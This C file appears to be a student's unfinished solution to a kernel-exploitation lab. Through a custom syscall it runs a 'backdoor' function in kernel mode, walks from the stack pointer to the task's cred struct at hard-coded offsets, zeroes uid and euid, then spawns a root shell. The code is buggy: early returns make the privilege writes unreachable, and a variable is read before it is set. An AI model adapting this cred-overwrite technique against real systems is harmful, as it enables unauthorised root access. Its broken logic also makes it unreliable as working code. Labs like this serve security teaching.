#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
// Backdoor function
// NOTE: This function is supposed to execute in kernel space
// Therefore, you should make NO system calls or the kernel will crash
unsigned long see = 0;
 //sp,thread size,thread_info()
void*current_thread_info(void){
unsigned long sp;
see = sp;
    asm("mov %%rsp,%0" : "=g" (sp));
return (void *)(sp - (1UL <<12));
}
void backdoor() {
    // First, locate thread info. Check kernel source code arch/x86/include/asm/thread_info.h`
    // Note that you cannot get it directly with the system call. 
     //thread_info
long * a = current_thread_info();
return;
    // Next, you need to find thread_info->task->cred
    //
    // 1.  Use GDB to inspect the kernel stack and find what is the relationship between thread_info and thread_info->task->cred.
    // 2.  Note that this function is executed in the kernel that you can read/write directly.
    
    // Finally, you will need to rewrite the cred struct (uid and euid) and give your process highest privilege
see = a;
//task ptr is first 8byte in thread info struct and a has value of that and this stored into *task
long * task = *a;

//see = *task;
//cred address = 182 64 bit ints from task
long * cred = task + 1456/8;
//cred2 = cred2
int * cred2 = cred;
//cred + 4
int * uid = cred2 + 1;
//cred + 20
int * euid = cred2 + 5;
see = *uid;
return;
//moves by size of 8
*uid = 0;
return;
*euid=0;

//*see 
return; 
unsigned long sp;
    asm("mov %%rsp,%0" : "=g" (sp));
    
    return;
}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"geteuid() = %d\n",geteuid());
    // Run the exploit    
    // You will need to use provided system calls to execute the backdoor() function in kernel mode 
//    backdoor();
    syscall(327,1,backdoor);
       syscall(327,2,backdoor);
   syscall(327,3,backdoor);
   syscall(327,4,backdoor);
   printf("see: %lx",see);
   fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"geteuid() = %d\n",geteuid());
    if (getuid() == 0&&geteuid()==0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/bin/sh", NULL};
        execv("/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
